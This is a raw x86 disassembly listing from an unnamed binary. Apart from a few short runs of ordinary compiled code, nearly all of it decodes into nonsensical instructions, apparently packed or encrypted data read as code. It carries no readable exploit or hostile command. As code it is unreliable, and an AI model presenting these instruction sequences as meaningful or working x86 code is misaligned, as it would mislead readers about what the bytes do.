  4030a3:	add    esp,DWORD PTR [edi+0x54adce8d]
  4030a9:	dec    ebp
  4030aa:	fldenv [ecx+0x735cd91a]
  4030b0:	ret    0xe292
  4030b3:	xchg   ecx,eax
  4030b4:	xchg   edx,eax
  4030b5:	stos   DWORD PTR es:[edi],eax
  4030b6:	out    dx,al
  4030b7:	pop    esi
  4030b8:	inc    ecx
  4030b9:	and    eax,0x62a054a8
  4030be:	cmp    eax,0x123a557b
  4030c3:	fistp  DWORD PTR [esi+0x77]
  4030c6:	pusha  
  4030c7:	sub    bh,dh
  4030c9:	push   ecx
  4030ca:	fild   DWORD PTR [ebx]
  4030cc:	and    DWORD PTR ds:0xaadf89fa,eax
  4030d2:	push   0xffffffa8
  4030d4:	scas   al,BYTE PTR es:[edi]
  4030d5:	popf   
  4030d6:	arpl   WORD PTR [edx],cx
  4030d8:	test   eax,0x626323a3
  4030dd:	or     dl,BYTE PTR [esi+0x5c0c58aa]
  4030e3:	std    
  4030e4:	clc    
  4030e5:	fwait
  4030e6:	out    0xf1,al
  4030e8:	adc    DWORD PTR [edi],ebp
  4030ea:	les    eax,FWORD PTR [ebp+0x37]
  4030ed:	dec    esp
  4030ee:	push   ecx
  4030ef:	jecxz  0x40315c
  4030f1:	loope  0x403133
  4030f3:	mov    ds:0x373607ee,al
  4030f8:	mov    al,ds:0x801418e2
  4030fd:	or     al,0xc5
  4030ff:	xor    ecx,0xf6280010
  403105:	or     cl,BYTE PTR [edi]
  403107:	and    edx,edx
  403109:	xor    al,0x86
  40310b:	jnp    0x403173
  40310d:	cmp    al,0xce
  40310f:	or     eax,0x8f97f462
  403114:	jge    0xffa8b87e
  40311a:	push   cs
  40311b:	dec    eax
  40311c:	mov    ecx,0x6874d9c0
  403121:	repnz arpl WORD PTR [eax],ax
  403124:	loop   0x403191
  403126:	add    esi,DWORD PTR [ecx]
  403128:	jne    0x4030e4
  40312a:	push   ebx
  40312b:	hlt    
  40312c:	push   ebp
  40312d:	retf   
  40312e:	(bad)  
  40312f:	xchg   edx,eax
  403130:	test   ebx,esi
  403132:	fwait
  403133:	test   al,0x70
  403135:	out    0x51,eax
  403137:	cli    
  403138:	mov    al,0xa4
  40313a:	icebp  
  40313b:	mov    DWORD PTR [ecx],eax
  40313d:	mov    eax,DWORD PTR [ebp-0x24]
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0xba
  40316d:	sbb    eax,0x15893a9f
  403172:	jle    0x4031f2
  403174:	outs   dx,DWORD PTR ds:[esi]
  403175:	jge    0x4031f5
  403177:	jle    0x403133
  403179:	sub    BYTE PTR [esp+eax*4+0x3e],dh
  40317d:	call   0x882ce73a
  403182:	sub    BYTE PTR [ebx+0x8910a5d],bh
  403188:	(bad)  
  40318a:	les    esp,FWORD PTR [ebp-0xa956c22]
  403190:	mov    eax,0x97678aea
  403195:	es (bad) 
  403197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403198:	psrld  mm5,QWORD PTR [edx+eax*4+0x28c7063a]
  4031a0:	adc    edx,DWORD PTR [ebx-0x50]
  4031a3:	jb     0x403132
  4031a5:	inc    esp
  4031a6:	aad    0x27
  4031a8:	in     eax,dx
  4031a9:	xchg   esi,eax
  4031aa:	cmp    eax,DWORD PTR [ecx-0x62f7ad8b]
  4031b0:	test   al,0xcf
  4031b2:	(bad)  ds:0x6d32bc56
  4031b8:	dec    esp
  4031b9:	jmp    0xb4a6:0xbe8c9a77
  4031c0:	xchg   ebp,eax
  4031c1:	addr16 add al,0x15
  4031c4:	adc    bl,BYTE PTR [ecx]
  4031c6:	imul   edi,DWORD PTR [ebp+0x56],0xe186e2a8
  4031cd:	mov    ds:0xeb37d01d,eax
  4031d2:	repz jno 0x4031d2
  4031d5:	mov    ah,BYTE PTR [eax-0x5f]
  4031d8:	stc    
  4031d9:	fisttp DWORD PTR [eax]
  4031db:	jmp    0x9daa:0xf5660551
  4031e2:	call   0x30bb:0x8774b32d
  4031e9:	add    bh,cl
  4031eb:	ds and eax,0x9fc5552f
  4031f1:	in     al,dx
  4031f2:	repz xchg ecx,eax
  4031f4:	mov    eax,ds:0xb6821b9c
  4031f9:	nop
  4031fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031fb:	jg     0x4031c7
  4031fd:	(bad)  
  4031fe:	imul   BYTE PTR [ecx-0x6e]
  403201:	aad    0x66
  403203:	adc    DWORD PTR [ebp-0x5aab93ab],0x57
  40320a:	sbb    al,0x5c
  40320c:	push   0xffffffe7
  40320e:	push   ds
  40320f:	inc    esp
  403210:	xor    al,0xce
  403212:	icebp  
  403213:	pop    DWORD PTR [ecx-0x2b]
  403216:	in     eax,dx
  403217:	(bad)  
  403218:	scas   al,BYTE PTR es:[edi]
  403219:	sbb    al,BYTE PTR [ebx-0x5e]
  40321c:	xor    eax,edi
  40321e:	dec    edi
  40321f:	cmp    al,0x3d
  403221:	call   0xd81:0x3680e33a
  403228:	sub    al,0x7b
  40322a:	in     eax,dx
  40322b:	ins    DWORD PTR es:[edi],dx
  40322c:	jecxz  0x4031c0
  40322e:	clc    
  40322f:	jmp    0x40326b
  403231:	fidivr DWORD PTR [esi+0x261288ac]
  403237:	pusha  
  403238:	mov    bh,0xac
  40323a:	push   cs
  40323b:	popf   
  40323c:	push   ecx
  40323d:	fs pusha 
  40323f:	popa   
  403240:	lock adc dh,BYTE PTR [edx]
  403243:	cmp    bl,BYTE PTR [ebx]
  403245:	push   0x544dc290
  40324a:	or     ebx,DWORD PTR [ecx-0x71]
  40324d:	fstp   DWORD PTR [edi+eiz*4-0x53]
  403251:	dec    edi
  403252:	inc    esp
  403253:	sub    dl,BYTE PTR [ebx]
  403255:	add    eax,0xf06e23eb
  40325a:	bound  esi,QWORD PTR [esi+0xe27e236]
  403260:	pusha  
  403261:	div    BYTE PTR [edx]
  403263:	jne    0x403246
  403265:	push   cs
  403266:	outs   dx,DWORD PTR ds:[esi]
  403267:	jl     0x4032de
  403269:	adc    BYTE PTR [ecx+edi*4-0x17cb39c6],ch
  403270:	rcr    DWORD PTR [edi-0x4ffe008],1
  403276:	fidivr WORD PTR [edi-0x3]
  40327a:	ss xchg ebx,eax
  40327c:	loope  0x4032bf
  40327e:	push   eax
  40327f:	test   al,0xef
  403281:	adc    eax,0xd05a809b
  403286:	neg    DWORD PTR [edx+esi*4]
  403289:	or     DWORD PTR [ebp-0x68ca9039],esi
  40328f:	jle    0x4032f4
  403291:	jl     0x403286
  403293:	out    dx,eax
  403294:	lds    ebp,FWORD PTR [eax+0x1fe5190b]
  40329a:	sbb    BYTE PTR [esi-0x70],bh
  40329d:	push   ebp
  40329e:	jecxz  0x403270
  4032a0:	or     ch,bl
  4032a2:	jl     0x403255
  4032a4:	pop    edx
  4032a5:	sbb    al,0x58
  4032a7:	imul   ecx,esp,0x8fc45671
  4032ad:	dec    edi
  4032ae:	imul   DWORD PTR [eax]
  4032b0:	sar    BYTE PTR [edx-0x41],1
  4032b3:	ror    BYTE PTR [edx+0x5fce4ea2],1
  4032b9:	(bad)  
  4032ba:	into   
  4032bb:	lea    ebp,[edx]
  4032bd:	sub    DWORD PTR [ebx],edi
  4032bf:	int3   
  4032c0:	data16 add bl,dl
  4032c3:	fisub  DWORD PTR [edx-0x66]
  4032c6:	mov    eax,0x82f37f39
  4032cb:	jbe    0x403291
  4032cd:	(bad)  
  4032ce:	jmp    0xdc9a3ef7
  4032d3:	popa   
  4032d4:	outs   dx,BYTE PTR ds:[esi]
  4032d5:	(bad)  
  4032d6:	(bad)  [eax-0x4c]
  4032d9:	mov    BYTE PTR [ecx+ecx*4-0x618d8127],bl
  4032e0:	cmp    edx,edx
  4032e2:	cdq    
  4032e3:	mov    bh,0xa7
  4032e5:	sbb    ch,bh
  4032e7:	mov    bl,0x55
  4032e9:	push   ss
  4032ea:	inc    edi
  4032eb:	nop
  4032ec:	and    BYTE PTR [eax-0x5a],0x20
  4032f0:	mov    ebx,DWORD PTR [eax+0x67]
  4032f3:	adc    DWORD PTR [ebx+0x74],edi
  4032f6:	dec    ebp
  4032f7:	adc    al,0xe3
  4032f9:	outs   dx,DWORD PTR ds:[esi]
  4032fa:	mul    BYTE PTR [edx+0x1a]
  4032fd:	jb     0x4032b2
  4032ff:	retf   0xe5e1
  403302:	data16 das 
  403304:	sahf   
  403305:	mov    al,ds:0x30dffe1f
  40330a:	mov    al,dl
  40330c:	mov    bh,0x37
  40330e:	xor    DWORD PTR [ecx],ecx
  403310:	dec    ecx
  403311:	dec    ebx
  403312:	adc    al,0x91
  403314:	xor    eax,0xe7d52ebc
  403319:	mov    esp,DWORD PTR [esi+eax*8-0x467559bf]
  403320:	adc    cl,al
  403322:	and    edi,ebp
  403324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403325:	and    al,0x3a
  403327:	adc    BYTE PTR [edx],cl
  403329:	and    DWORD PTR [ebx],edx
  40332b:	fadd   st,st(5)
  40332d:	lock stos DWORD PTR es:[edi],eax
  40332f:	dec    eax
  403330:	imul   esi,eax,0x9608f1c7
  403336:	bswap  esi
  403338:	push   edi
  403339:	rcr    DWORD PTR [edi-0xa452133],0x4e
  403340:	push   ecx
  403341:	mov    cl,0x3f
  403343:	jo     0x403381
  403345:	sub    eax,0xc21c45b6
  40334a:	lods   al,BYTE PTR ds:[esi]
  40334b:	push   edx
  40334c:	mov    ah,0xd
  40334e:	ja     0x4032dd
  403350:	jns    0x4032e3
  403352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403353:	jmp    0x1bda:0xe4fe064e
  40335a:	sub    dh,BYTE PTR [ebx-0x66]
  40335d:	pop    ss
  40335e:	xchg   DWORD PTR [edi+0xab19931],edx
  403364:	mov    ds:0x337a6c50,al
  403369:	pop    ebp
  40336a:	das    
  40336b:	push   edi
  40336c:	arpl   cx,ax
  40336e:	aam    0x88
  403370:	das    
  403371:	push   0xa4e2adeb
  403376:	stos   BYTE PTR es:[edi],al
  403377:	cli    
  403378:	into   
  403379:	adc    ebp,DWORD PTR [esi]
  40337b:	call   0x8635:0x80c89cbf
  403382:	ds or  eax,0x98fa3388
  403388:	out    0xb4,al
  40338a:	fst    QWORD PTR [ecx-0x7c]
  40338d:	push   cs
  40338e:	pop    ds
  40338f:	test   DWORD PTR [ebp+ecx*4+0x69dbb694],0xafc38964
  40339a:	sub    DWORD PTR [edi],esp
  40339c:	pop    eax
  40339d:	fadd   st(6),st
  40339f:	test   BYTE PTR [edi],al
  4033a1:	jp     0x40333d
  4033a3:	out    dx,eax
  4033a4:	mov    edx,0xe055fcc8
  4033a9:	pop    edi
  4033aa:	loope  0x403349
  4033ac:	(bad)
  4033af:	mov    esi,0xb4878aee
  4033b4:	shl    BYTE PTR [ecx+0x31],cl
  4033b7:	sbb    ecx,DWORD PTR [edx+ebx*2+0x1057cccb]
  4033be:	out    0xc5,al
  4033c0:	retf   0x746
  4033c3:	leave  
  4033c4:	mov    esi,0x50f2c3f1
  4033c9:	repnz push cs
  4033cb:	dec    ebx
  4033cc:	add    BYTE PTR [ecx-0x259f7a55],al
  4033d2:	sahf   
  4033d3:	fwait
  4033d4:	sbb    dl,BYTE PTR ds:0x8ca63492
  4033da:	fsubr  DWORD PTR [esi+edx*1+0x51]
  4033de:	and    ch,bh
  4033e0:	xor    esi,edi
  4033e2:	dec    esi
  4033e3:	jnp    0x403437
  4033e5:	cmp    al,0xcc
  4033e7:	jb     0x403449
  4033e9:	jne    0x4033c2
  4033eb:	pop    esi
  4033ec:	cmc    
  4033ed:	in     eax,0x94
  4033ef:	leave  
  4033f0:	or     al,0x2e
  4033f2:	push   esp
  4033f3:	add    al,0x45
  4033f5:	xchg   esi,eax
  4033f6:	in     eax,dx
  4033f7:	mov    ch,0xba
  4033f9:	into   
  4033fa:	fimul  DWORD PTR [esi]
  4033fc:	inc    esi
  4033fd:	mov    eax,ss
  4033ff:	add    BYTE PTR [edi+0x20153481],0xa4
  403406:	xor    al,0x17
  403408:	(bad)  
  403409:	lock push es
  40340b:	pop    ds
  40340c:	mov    esp,0x56cac96e
  403411:	jg     0x40344c
  403413:	out    dx,al
  403414:	sbb    al,0xd5
  403416:	mov    ebp,0x2a9c428e
  40341b:	mov    al,ds:0x4648d989
  403420:	xor    al,0xc5
  403422:	call   0xda6d7d67
  403427:	push   eax
  403428:	dec    edi
  403429:	or     al,0x72
  40342b:	cmp    eax,esi
  40342d:	mov    eax,DWORD PTR [edx]
  40342f:	lea    ebx,ds:0xbd869814
  403435:	cwde   
  403436:	sahf   
  403437:	hlt    
  403438:	test   eax,0x297acdac
  40343d:	sbb    DWORD PTR ds:0xf3e5a72e,esp
  403443:	imul   esp,DWORD PTR [eax+0x17427d01],0xf4385d4a
  40344d:	loope  0x40341a
  40344f:	mov    al,0x65
  403451:	(bad)  
  403452:	pop    edi
  403453:	sbb    dl,dh
  403455:	retf   
  403456:	xchg   edx,eax
  403457:	fcmovb st,st(4)
  403459:	push   ecx
  40345a:	daa    
  40345b:	es ins DWORD PTR es:[edi],dx
  40345d:	mov    BYTE PTR [ebx-0x39d455dd],bh
  403463:	push   esi
  403464:	test   BYTE PTR [ebx+0x28],ah
  403467:	fdiv   DWORD PTR [esi+0x5f5dad57]
  40346d:	sahf   
  40346e:	retfw  0x462a
  403472:	loop   0x403459
  403474:	(bad)  
  403475:	jae    0x403410
  403477:	inc    ebp
  403478:	pop    edx
  403479:	shl    al,cl
  40347b:	lods   eax,DWORD PTR ds:[esi]
  40347c:	jl     0x403459
  40347e:	mov    bh,0xc7
  403480:	mov    dl,0xf9
  403482:	xlat   BYTE PTR ds:[ebx]
  403483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403484:	cli    
  403485:	leave  
  403486:	cmp    al,0x2b
  403488:	(bad)  
  403489:	xor    eax,0x1aee6741
  40348e:	popa   
  40348f:	ret    
  403490:	dec    edi
  403491:	test   eax,0x662a47ed
  403496:	xchg   esi,eax
  403497:	pop    esp
  403498:	mov    ds:0xd0405273,eax
  40349d:	jnp    0x403446
  40349f:	fucomp st(0)
  4034a1:	shl    dl,1
  4034a3:	mov    al,ds:0x10ef0076
  4034a8:	pop    ss
  4034a9:	push   esi
  4034aa:	mov    ds:0xe650c004,al
  4034af:	push   esp
  4034b0:	and    eax,0x63e5530
  4034b5:	loope  0x403457
  4034b7:	lock push eax
  4034b9:	ja     0x403470
  4034bb:	xchg   BYTE PTR [eax-0x36],bh
  4034be:	nop
  4034bf:	in     al,0xa3
  4034c1:	hlt    
  4034c2:	aad    0xe1
  4034c4:	cli    
  4034c5:	dec    eax
  4034c6:	jle    0x4034f8
  4034c8:	inc    edx
  4034c9:	xchg   edi,eax
  4034ca:	loop   0x40344c
  4034cc:	(bad)  [eax+0x7931752f]
  4034d2:	mov    bl,0x66
  4034d4:	cmp    eax,edi
  4034d6:	mov    ?,WORD PTR [eax-0x36]
  4034d9:	adc    esi,DWORD PTR [edx]
  4034db:	adc    ah,BYTE PTR [eax-0x70318d3e]
  4034e1:	out    0x5a,eax
  4034e3:	dec    esi
  4034e4:	ds fwait
  4034e6:	enter  0x7292,0x1e
  4034ea:	add    eax,0x5bbaef49
  4034ef:	mov    eax,gs:0x2a801ffd
  4034f5:	jmp    0xa66d:0x941d61fb
  4034fc:	sub    esp,DWORD PTR [edx-0x280c9776]
  403502:	fistp  QWORD PTR [eax+ecx*2-0x325919a0]
  403509:	lahf   
  40350a:	add    eax,0xc5cb3c25
  40350f:	je     0x4034e6
  403511:	inc    eax
  403512:	mov    al,0x3c
  403514:	add    eax,0x8bf8654c
  403519:	fwait
  40351a:	pop    ecx
  40351b:	cmp    DWORD PTR [ebp-0x2a],edx
  40351e:	pushf  
  40351f:	fwait
  403520:	add    eax,0x87f1565d
  403525:	push   esp
  403526:	ja     0x4034f3
  403528:	sub    esp,edi
  40352a:	retf   0xe89b
  40352d:	pop    edx
  40352e:	cmp    DWORD PTR [esi],edi
  403530:	inc    ecx
  403531:	mov    bh,0xea
  403533:	fnstsw WORD PTR [ebx-0x4]
  403536:	aad    0xde
  403538:	adc    ebx,DWORD PTR [ecx]
  40353a:	out    dx,al
  40353b:	and    al,0x5
  40353d:	test   al,0x17
  40353f:	inc    eax
  403540:	rcr    bh,cl
  403542:	inc    edx
  403543:	jg     0x4034ce
  403545:	jb     0x4034de
  403547:	and    BYTE PTR [ebx+0x4dd9442a],cl
  40354d:	test   DWORD PTR [edx+0xf],esp
  403550:	mov    dh,0xa2
  403552:	add    al,0x2e
  403554:	mov    esp,0xe3b968e
  403559:	stos   BYTE PTR es:[edi],al
  40355a:	pushf  
  40355b:	mov    ch,0x47
  40355d:	and    ebx,DWORD PTR [ecx]
  40355f:	adc    bl,bl
  403561:	mov    cl,0xf8
  403563:	lods   al,BYTE PTR ds:[esi]
  403564:	push   esi
  403565:	pop    ss
  403566:	stos   BYTE PTR es:[edi],al
  403567:	adc    bh,BYTE PTR [edx-0x7607b275]
  40356d:	inc    ecx
  40356e:	adc    BYTE PTR [ebx-0x23ba7440],cl
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	sub    ebx,DWORD PTR ds:0x1186ef4f
  40359d:	jle    0x40361d
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x40360a
  4035a4:	scas   eax,DWORD PTR es:[edi]
  4035a5:	push   ebp
  4035a6:	cmp    al,0xbe
  4035a8:	jb     0x4035ef
  4035aa:	(bad)  
  4035ab:	push   ebx
  4035ac:	(bad)  
  4035ad:	mov    dl,0x7d
  4035af:	fmulp  st(7),st
  4035b2:	(bad)  
  4035b4:	jmp    0x3ae2c847
  4035b9:	adc    eax,0x4cb79e5e
  4035be:	xchg   esi,eax
  4035bf:	and    edi,ebp
  4035c1:	xor    al,0xee
  4035c3:	test   al,0xb1
  4035c5:	lock mov bl,0x14
  4035c8:	mov    esp,0xc7e1c426
  4035cd:	inc    esp
  4035ce:	pop    es
  4035cf:	sbb    dh,dl
  4035d1:	aas    
  4035d2:	sbb    eax,0xc721391f
  4035d7:	stc    
  4035d8:	call   0x5cec:0x5f9621c7
  4035df:	cmc    
  4035e0:	test   eax,0x69fbd4c3
  4035e5:	or     BYTE PTR [ebx+0x60328ad0],dh
  4035eb:	shr    edi,cl
  4035ed:	addr16 cdq 
  4035ef:	outs   dx,BYTE PTR ds:[esi]
  4035f0:	adc    DWORD PTR [esi+0x65],esp
  4035f3:	mov    ebp,0x5d257c39
  4035f8:	adc    al,0xae
  4035fa:	and    al,0x18
  4035fc:	dec    ebp
  4035fd:	jmp    0x4035b5
  4035ff:	out    0x61,al
  403601:	es sbb al,0x63
  403604:	mov    bl,0x49
  403606:	pop    ecx
  403607:	cld    
  403608:	mov    bh,0x7a
  40360a:	mov    eax,ds:0xc71ee205
  40360f:	rcr    BYTE PTR [ecx+0x5c970fc5],1
  403615:	mov    bh,0xc2
  403617:	mov    al,0x7d
  403619:	or     DWORD PTR [eax-0x6f],0xb66960f4
  403620:	call   FWORD PTR [ebp+0x3873ae6b]
  403626:	push   esi
  403627:	inc    ebx
  403628:	push   ds
  403629:	xor    esi,ebp
  40362b:	adc    al,0xfa
  40362d:	mov    eax,0x62ae468
  403632:	mov    dh,0x96
  403634:	or     BYTE PTR [ebx-0x3c],0x19
  403638:	shl    BYTE PTR [ebx+edx*8+0x70eb3188],1
  40363f:	xchg   esp,eax
  403640:	jo     0x403615
  403642:	xor    BYTE PTR [ebx+0x24],0x11
  403646:	test   ah,cl
  403648:	add    eax,0x6837816a
  40364d:	imul   esi,DWORD PTR [edi+0x63],0x15
  403651:	sbb    al,0xb2
  403653:	js     0x4036b8
  403655:	ret    
  403656:	retf   
  403657:	int3   
  403658:	out    dx,al
  403659:	outs   dx,BYTE PTR ds:[esi]
  40365a:	xchg   esp,eax
  40365b:	repnz inc edx
  40365d:	(bad)  
  40365e:	jp     0x403647
  403660:	xor    BYTE PTR [edi-0xe72fb77],bh
  403666:	sub    eax,0xbaa12415
  40366b:	and    eax,0x3703d41
  403670:	mov    edx,0x19fb6bc
  403675:	lds    ebp,FWORD PTR [edi]
  403677:	inc    edi
  403678:	mov    ch,0xc6
  40367a:	cld    
  40367b:	prefetch (bad)
  40367c:	or     eax,0x51146afd
  403681:	mov    eax,0x2745f912
  403686:	xor    eax,ebp
  403688:	cmc    
  403689:	aam    0x3
  40368b:	jb     0x4036c1
  40368d:	inc    ebp
  40368e:	dec    edi
  40368f:	jb     0x403667
  403691:	cmp    BYTE PTR [ecx],bl
  403693:	lods   al,BYTE PTR ds:[esi]
  403694:	fstp   QWORD PTR [ebp+0x1f]
  403697:	pushf  
  403698:	test   eax,ebx
  40369a:	mov    ebp,0xaf9f6ad5
  40369f:	sbb    al,0xad
  4036a1:	in     al,0x7e
  4036a3:	outs   dx,BYTE PTR ds:[esi]
  4036a4:	in     eax,0x51
  4036a6:	mov    esp,0x4b832e21
  4036ab:	xchg   BYTE PTR [esi+0x36],ch
  4036ae:	stc    
  4036af:	sahf   
  4036b0:	jecxz  0x4036eb
  4036b2:	lds    esp,FWORD PTR ds:0xb0881f8b
  4036b8:	pushf  
  4036b9:	mov    cs,WORD PTR [edi+0x1e]
  4036bc:	inc    ebp
  4036bd:	hlt    
  4036be:	test   al,0xd8
  4036c0:	pop    ss
  4036c1:	jmp    DWORD PTR [ebx+0x3e]
  4036c4:	les    eax,FWORD PTR [esi+0x14]
  4036c7:	leave  
  4036c8:	mov    BYTE PTR [ebx+0x57],cl
  4036cb:	arpl   WORD PTR [eax+0x36],si
  4036ce:	xchg   ebp,eax
  4036cf:	jno    0x403720
  4036d1:	retf   0x6f18
  4036d4:	mov    al,ds:0x76a4902c
  4036d9:	sub    ebx,ebp
  4036db:	fs jp  0x668f0a12
  4036e2:	mov    esp,0xb62eaa9e
  4036e7:	(bad)  
  4036e8:	sbb    bl,BYTE PTR [edi-0x6b]
  4036eb:	call   0xccb5:0x5d62e9a7
  4036f2:	fsubr  DWORD PTR [eax-0x44]
  4036f5:	fdivr  DWORD PTR [edi+esi*1+0x21]
  4036f9:	ins    DWORD PTR es:[edi],dx
  4036fa:	mov    ebp,0xa367752c
  4036ff:	(bad)  
  403700:	cmp    DWORD PTR [ecx-0x5d],ebx
  403703:	(bad)  
  403704:	xlat   BYTE PTR ds:[ebx]
  403705:	aad    0x42
  403707:	pop    edx
  403708:	push   edi
  403709:	stc    
  40370a:	stos   DWORD PTR es:[edi],eax
  40370b:	cmp    al,0x23
  40370d:	ins    BYTE PTR es:[edi],dx
  40370e:	pop    ds
  40370f:	dec    edx
  403710:	imul   ecx,edi,0x74c7d152
  403716:	or     bh,cl
  403718:	iret   
  403719:	stos   BYTE PTR es:[edi],al
  40371a:	dec    eax
  40371b:	mov    ah,0x1f
  40371d:	cmc    
  40371e:	in     al,0x64
  403720:	push   ebp
  403721:	jmp    0x4036bd
  403723:	jbe    0x403708
  403725:	shl    DWORD PTR [esi],0x38
  403728:	rol    DWORD PTR [edi+0x59],1
  40372b:	stos   DWORD PTR es:[edi],eax
  40372c:	sub    eax,0xca844285
  403731:	jmp    0x328089d9
  403736:	mov    esp,0xcaa447b9
  40373b:	scas   eax,DWORD PTR es:[edi]
  40373c:	push   0xffffffbe
  40373e:	stos   DWORD PTR es:[edi],eax
  40373f:	push   ebp
  403740:	cmp    eax,0xd3f3e597
  403745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403746:	xchg   edx,eax
  403747:	push   edx
  403748:	in     al,dx
  403749:	mul    DWORD PTR [ebp+0x23593c69]
  40374f:	jecxz  0x403795
  403751:	in     eax,0x16
  403753:	aas    
  403754:	pop    esi
  403755:	loope  0x403785
  403757:	js     0x40370d
  403759:	mov    cl,0x4a
  40375c:	mov    ch,0xa9
  40375e:	mov    bh,0xe1
  403760:	call   0xc11:0xbce1aa2d
  403767:	mov    ebp,0xb4b38283
  40376c:	fst    QWORD PTR [ebp-0x74]
  40376f:	xchg   esp,eax
  403770:	sbb    eax,0x51bf41e6
  403775:	xor    BYTE PTR [ecx],bh
  403777:	inc    esp
  403778:	hlt    
  403779:	pop    ebx
  40377a:	aam    0x4d
  40377c:	mov    edi,0x760cfb3e
  403781:	mov    ecx,0xa252a555
  403786:	out    dx,al
  403787:	stos   DWORD PTR es:[edi],eax
  403788:	mov    ds,WORD PTR ds:0x38c0ce39
  40378e:	jmp    0xf860:0x774c20da
  403795:	push   es
  403796:	outs   dx,DWORD PTR ds:[esi]
  403797:	retf   
  403798:	cdq    
  403799:	cmp    al,0xf9
  40379b:	adc    eax,0x9c935e2e
  4037a0:	rcr    BYTE PTR [esi-0x49122746],1
  4037a6:	leave  
  4037a7:	push   esp
  4037a8:	add    edi,DWORD PTR [ecx-0x59]
  4037ab:	aam    0xab
  4037ad:	xor    DWORD PTR [ecx],ecx
  4037af:	out    dx,al
  4037b0:	aam    0x2b
  4037b2:	nop
  4037b3:	xor    al,0xec
  4037b5:	fimul  DWORD PTR [ebx+edx*2]
  4037b8:	fsubr  DWORD PTR [eax-0x1545ec01]
  4037be:	sbb    al,cl
  4037c0:	popf   
  4037c1:	ins    BYTE PTR es:[edi],dx
  4037c2:	adc    eax,0x281f8221
  4037c7:	lds    esp,FWORD PTR [ecx+edx*2-0x2be50b1f]
  4037ce:	loopne 0x40376d
  4037d0:	adc    DWORD PTR [eax],esi
  4037d2:	retf   0x63f3
  4037d5:	jg     0x40382c
  4037d7:	jno    0x40381c
  4037d9:	fisttp QWORD PTR [esi+0x3635bf82]
  4037df:	mov    esp,0xe2f0fd46
  4037e4:	push   es
  4037e5:	fs (bad) 
  4037e8:	inc    esp
  4037e9:	lds    esp,FWORD PTR [edi]
  4037eb:	and    BYTE PTR cs:[edi],0x83
  4037ef:	fadd   DWORD PTR [ebp+0x6c]
  4037f2:	jo     0x403817
  4037f4:	addr16 mov eax,ds:0x8a0
  4037f8:	cmp    edx,edi
  4037fa:	add    edx,eax
  4037fc:	ins    BYTE PTR es:[edi],dx
  4037fd:	cs test al,0xc6
  403800:	imul   eax,ebx,0x34b34a60
  403806:	ret    
  403807:	lahf   
  403808:	adc    ch,dh
  40380a:	gs arpl bp,ax
  40380d:	fmulp  st(3),st
  40380f:	jbe    0x40380f
  403811:	(bad)  
  403813:	sub    DWORD PTR [ebx-0x3ae7098f],edi
  403819:	inc    edx
  40381a:	test   al,0xc9
  40381c:	cld    
  40381d:	mov    esp,0xc0bbeca5
  403822:	xchg   ebp,eax
  403823:	outs   dx,BYTE PTR ds:[esi]
  403824:	aaa    
  403825:	icebp  
  403826:	stos   BYTE PTR es:[edi],al
  403827:	mov    dh,0x6d
  403829:	(bad)  
  40382a:	xor    DWORD PTR [edi+0x17c0b31b],edi
  403830:	dec    edi
  403831:	push   ebx
  403832:	jmp    0x403840
  403834:	mov    bl,dl
  403836:	xor    eax,0xeec67bc5
  40383b:	aas    
  40383c:	(bad)  
  40383d:	daa    
  40383e:	sbb    eax,0x249c9769
  403843:	xor    DWORD PTR [esi+0xdbff47b],esi
  403849:	mov    dh,0x7d
  40384b:	fistp  QWORD PTR [edi]
  40384d:	(bad)  
  40384e:	in     al,dx
  40384f:	sub    bh,bl
  403851:	dec    ecx
  403852:	fdiv   DWORD PTR [edi+edi*2-0x4]
  403856:	mov    edx,0x93b4e44b
  40385b:	fdivr  DWORD PTR [ebx+ecx*4-0x13cdecb3]
  403862:	sub    al,BYTE PTR [ecx-0xe]
  403865:	test   eax,0x54d120fa
  40386a:	loop   0x40383e
  40386c:	lds    ebx,FWORD PTR [ecx]
  40386e:	imul   edx,DWORD PTR [esi+0x46b2ccdb],0x1dcd4ec
  403878:	idiv   esp
  40387a:	sti    
  40387b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40387c:	jge    0x40386a
  40387e:	xchg   ebp,eax
  40387f:	out    dx,eax
  403880:	stc    
  403881:	cmp    ebx,esp
  403883:	pushf  
  403884:	pop    ecx
  403885:	pushw  ds
  403887:	dec    esp
  403888:	jl     0x403889
  40388a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40388c:	aaa    
  40388d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40388e:	scas   eax,DWORD PTR es:[edi]
  40388f:	push   ebp
  403890:	jecxz  0x4038d2
  403892:	sub    BYTE PTR [esi+0x30],0x89
  403896:	mov    dh,0x77
  403898:	xor    bh,BYTE PTR [eax]
  40389a:	add    bl,BYTE PTR [ecx-0x49]
  40389d:	enter  0x7c3d,0x4d
  4038a1:	adc    DWORD PTR [ebx],ecx
  4038a3:	cld    
  4038a4:	xlat   BYTE PTR ds:[ebx]
